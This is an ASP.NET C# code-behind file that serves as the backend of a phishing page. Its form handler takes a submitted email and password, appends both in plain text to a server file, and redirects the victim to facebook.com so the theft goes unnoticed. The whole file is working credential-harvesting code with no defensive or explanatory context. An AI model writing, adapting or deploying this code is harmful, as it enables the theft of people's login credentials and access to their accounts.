using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.IO;

public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {

    }

    protected void btnProcessForm_Click(object sender, EventArgs e)
    {
        string email = txtEmail.Text;
        string pass = txtPass.Text;

        string fileName = @"C:\inetpub\y0y0.txt";
        StreamReader reader = new StreamReader(fileName);

        string jj = reader.ReadToEnd();
        reader.Close();

        StreamWriter writer = new StreamWriter(fileName);

        using (writer)
        {

            writer.Write(jj);
            writer.WriteLine(email);
            writer.WriteLine(pass);
            writer.WriteLine();

        }

        Response.Redirect("http://www.facebook.com");


    }
}
